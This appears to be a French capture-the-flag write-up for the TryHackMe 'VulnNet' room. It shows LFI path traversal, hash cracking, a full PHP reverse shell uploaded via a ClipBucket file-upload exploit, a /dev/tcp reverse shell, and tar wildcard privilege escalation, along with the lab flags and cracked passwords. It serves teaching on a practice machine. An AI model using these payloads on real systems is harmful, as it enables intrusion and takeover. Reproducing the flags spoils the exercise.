# VulnNet #
## ask 1 VulnNet ##   

```bash
sudo sh -c "echo '10.10.84.10 vulnnet.thm' >> /etc/hosts"

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A vulnnet.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 11:01 CEST
Nmap scan report for vulnnet.thm (10.10.84.10)
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/17%OT=22%CT=1%CU=41756%PV=Y%DS=2%DC=T%G=Y%TM=616BE6
OS:93%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST
OS:11NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   33.28 ms 10.9.0.1
2   33.52 ms vulnnet.thm (10.10.84.10)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.74 second
```

D'après nmap il y deux services qui sont : 
Le service SSH sur le  port 22.    
Le service HTTP sur le port 80.    

![page](./Task1-01.png)   

Sur la page principale on voit pas grand chose.    

![page](./Task1-02.png)   

Quand on charge la page on voit deux script en javascipt.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/timruff/LinkFinder
Clonage dans 'LinkFinder'...
remote: Enumerating objects: 607, done.
remote: Total 607 (delta 0), reused 0 (delta 0), pack-reused 607
Réception d'objets: 100% (607/607), 1.10 Mio | 3.36 Mio/s, fait.
Résolution des deltas: 100% (292/292), fait.

tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ python linkfinder.py -d -i http://vulnnet.thm/ -o cli
Running against: http://vulnnet.thm/js/index__7ed54732.js

http://broadcast.vulnnet.thm
Running against: http://vulnnet.thm/js/index__d8338055.js

http://vulnnet.thm/index.php?referer=
image/png
img/favicon-32x32.png
css/font-awesome.css
css/pure-min.css
css/index.css
/login.html
/login
img/file-icons.png
/js/index__7ed54732.js
/js/index__d8338055.js

```

On télécharge LinkFinder qui nous permet de trouver des liens.  
Il nous trouve un lien http://broadcast.vulnnet.thm et un index.php?referer=.    

```bash
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ sudo sh -c "echo '10.10.84.10 broadcast.vulnnet.thm' >> /etc/hosts" 
```

On met notre nouvelle adresse dans le hosts.  

![page](./Task1-03.png)   

Quand on va sur la page principale de la nouvelle adresse on nous demande un mot des identifiants.   

```bash
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ curl http://vulnnet.thm?referer=..//..//..//..//..//..//..//etc/passwd
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
...
```

On arrive à lire le contenu le passwd, donc le site est vulbérable à la faile lfi.    

```bash
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ curl http://vulnnet.thm?referer=..//..//..//..//..//..//..///etc/apache2/.htpasswd
...
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
...
```

On lit le fichier .htpasswd, qui contient le nom de l'utilisateur et son mon de passe sous forme de hash.   

```bash
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ echo '$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ john ./hash -w=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (?)
1g 0:00:00:05 DONE (2021-10-17 12:10) 0.1919g/s 414808p/s 414808c/s 414808C/s 9991234..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed
tim@kali:~/Bureau/tryhackme/write-up/LinkFinder$ john ./hash --show
?:9972761drmfsls

1 password hash cracked, 0 left
```

On casse le hash avec john et on trouve le mot de passe qui est : 9972761drmfsls 

![page](./Task1-04.png)   

Un foit les identifiants mis on tombe sur page générer par clipBuckep.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute un sur le port 1234 pour avoir un shell.    

```php
tim@kali:~/Bureau/tryhackme/write-up$ cat shell.php 

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.9.228.66';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
```

On crée un reverse shell en php.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit clipbucket
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ClipBucket - 'beats_uploader' Arbitrary File Upload (Metasploit)                                                                                                                                            | php/webapps/44346.rb
Clipbucket 1.7 - 'dwnld.php' Directory Traversal                                                                                                                                                            | php/webapps/32802.txt
Clipbucket 1.7.1 - Multiple SQL Injections                                                                                                                                                                  | php/webapps/34694.txt
Clipbucket 2.4 RC2 645 - SQL Injection                                                                                                                                                                      | php/webapps/17325.py
Clipbucket 2.5 - Blind SQL Injection                                                                                                                                                                        | php/webapps/20708.txt
Clipbucket 2.5 - Cross-Site Request Forgery                                                                                                                                                                 | php/webapps/20666.html
Clipbucket 2.5 - Directory Traversal                                                                                                                                                                        | php/webapps/20704.txt
Clipbucket 2.6 - 'channels.php?cat' Cross-Site Scripting                                                                                                                                                    | php/webapps/36524.txt
Clipbucket 2.6 - 'channels.php?time' SQL Injection                                                                                                                                                          | php/webapps/36532.txt
Clipbucket 2.6 - 'collections.php?cat' Cross-Site Scripting                                                                                                                                                 | php/webapps/36525.txt
Clipbucket 2.6 - 'groups.php?cat' Cross-Site Scripting                                                                                                                                                      | php/webapps/36526.txt
Clipbucket 2.6 - 'search_result.php?query' Cross-Site Scripting                                                                                                                                             | php/webapps/36527.txt
Clipbucket 2.6 - 'videos.php?cat' Cross-Site Scripting                                                                                                                                                      | php/webapps/36528.txt
Clipbucket 2.6 - 'videos.php?time' SQL Injection                                                                                                                                                            | php/webapps/36531.txt
Clipbucket 2.6 - 'view_collection.php?type' Cross-Site Scripting                                                                                                                                            | php/webapps/36529.txt
Clipbucket 2.6 - 'view_item.php?type' Cross-Site Scripting                                                                                                                                                  | php/webapps/36530.txt
Clipbucket 2.6 - Multiple Vulnerabilities                                                                                                                                                                   | php/webapps/18341.txt
Clipbucket 2.6 Revision 738 - Multiple SQL Injections                                                                                                                                                       | php/webapps/23252.txt
Clipbucket 2.7 RC3 0.9 - Blind SQL Injection                                                                                                                                                                | php/webapps/36156.txt
ClipBucket 2.8 - 'id' SQL Injection                                                                                                                                                                         | php/webapps/45688.txt
ClipBucket 2.8.3 - Multiple Vulnerabilities                                                                                                                                                                 | php/webapps/42457.txt
ClipBucket 2.8.3 - Remote Code Execution                                                                                                                                                                    | php/webapps/42954.py
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                                                                                                         | php/webapps/44250.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------

tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/exploitdb/exploits/php/webapps/44250.txt 
...
Proof of concept:
-----------------
1. Unauthenticated OS Command Injection
Without having to authenticate, an attacker can exploit this vulnerability
by manipulating the "file_name" parameter during the file upload in the script
/api/file_uploader.php:

 $ curl -F "Filedata=@pfile.jpg" -F "file_name=aa.php ||<<COMMAND HERE>>"
http://$HOST/api/file_uploader.php


Alternatively, this vulnerability can also be exploited by authenticated basic
privileged users with the following payload by exploiting the same issue in
/actions/file_downloader.php:

$ curl --cookie "[--SNIP--]" --data "file=http://localhost/vid.mp4&file_name=abc
|| <<COMMAND HERE>>" "http://$HOST/actions/file_downloader.php"


2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"

Furthermore, this vulnerability is also available to authenticated users with
basic privileges:

$ curl --cookie "[--SNIP--]" -F
"coverPhoto=@valid-image-with-appended-phpcode.php"
"http://$HOST/edit_account.php?mode=avatar_bg"

...
```

On voit qu'il existe un exploit sans authentification qui existe.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl -F "file=@shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
{"success":"yes","file_name":"1634468149c81aca","extension":"php","file_directory":"2021\/10\/17"}
```

On injecte notre fichier.  

![page](./Task1-05.png) 

On exécute notre exploit à partire du lien http://broadcast.vulnnet.thm/files/photos/.  
Pour le reste suivre le lien.  

```bash
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.84.10.
Ncat: Connection from 10.10.84.10:48690.
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 12:57:30 up  2:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@vulnnet:/$ cd home
cd home

www-data@vulnnet:/home$ cd server-management
cd server-management
bash: cd: server-management: Permission denied

www-data@vulnnet:/var$ ls
ls
backups  crash	local  log   metrics  run    tmp
cache	 lib	lock   mail  opt      spool  www
www-data@vulnnet:/var$ cd backups
cd backups
www-data@vulnnet:/var/backups$ ls
ls
alternatives.tar.0     dpkg.diversions.2.gz    group.bak
apt.extended_states.0  dpkg.statoverride.0     gshadow.bak
dpkg.arch.0	       dpkg.statoverride.1.gz  passwd.bak
dpkg.arch.1.gz	       dpkg.statoverride.2.gz  shadow.bak
dpkg.arch.2.gz	       dpkg.status.0	       ssh-backup.tar.gz
dpkg.diversions.0      dpkg.status.1.gz        vulnnet-Monday.tgz
dpkg.diversions.1.gz   dpkg.status.2.gz        vulnnet-Sunday.tgz

www-data@vulnnet:/var/backups$ cp ./ssh-backup.tar.gz /tmp
cp ./ssh-backup.tar.gz /tmp

```

On obtient un shell, on va dans home mais on a pas l'autorisation d'aller dans server-management.  
Dans /var/backups/ on voit des fichiers sauvegardés. 
On copie le ssh-backup.tar.gz dans un endroit ou on peut l'extraire.  

```bash
www-data@vulnnet:/$ cd tmp
cd tmp
www-data@vulnnet:/tmp$ ls
ls
ssh-backup.tar.gz
tar -xzf ssh-backup.tar.gz
www-data@vulnnet:/tmp$ ls
ls
id_rsa	ssh-backup.tar.gz
www-data@vulnnet:/tmp$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----

```

On extrait la clef privée.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python2 /usr/share/john/ssh2john.py id_rsa > hash
tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-10-17 13:12) 0.3984g/s 5713Kp/s 5713Kc/s 5713KC/sa6_123..*7¡Vamos!
Session completed
```

On copie la clef et on la casse avec john the ripper.   
Le mot de passe est : oneTWO3gOyac.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 

tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa server-management@vulnnet.thm
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

```

**What is the user flag? (user.txt)**

Avec le mot de passe on obtient un shell.   

```bash
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

On le fichier user.txt et on obtient le flag.   
Le flag est : THM{907e420d979d8e2992f3d7e16bee1e8b}    

**What is the root flag? (root.txt)**

```bash
server-management@vulnnet:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

On que backupsrv.sh est exécuter par crontab.   

```bash
server-management@vulnnet:~$ cat /var/opt/backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
server-management@vulnnet:~$ ls -al /var/opt/backupsrv.sh 
-rwxr--r-- 1 root root 530 Jan 23  2021 /var/opt/backupsrv.sh
```

On voit que l'on peut pas écrire dans le fichier backupsrv.sh.  
On voit que dans le script la variabel $backup_files est une *, il est utilisé dans tar, on peut exploiter cette faille.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

On écoute sur le port 4444 pour avoir un shell.   

```bash
server-management@vulnnet:~$ cd Documents/
server-management@vulnnet:~/Documents$ echo "bash -c 'exec bash -i &>/dev/tcp/10.9.228.66/4444 <&1'" > shell.sh
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh shell.sh"
server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
```

On exploite la faille willcard de tar.  
On va lui faire exécuter notre reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.84.10.
Ncat: Connection from 10.10.84.10:37182.
bash: cannot set terminal process group (2609): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnnet:/home/server-management/Documents# id      
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet:/home/server-management/Documents# cat /root/root.txt
cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
root@vulnnet:/home/server-management/Documents# 
```

On attend un peu et on obtient un shell avec les droits root.   
On lit le fichier root.txt dans le répertoire root.   
On trouve le flag : THM{220b671dd8adc301b34c2738ee8295ba}   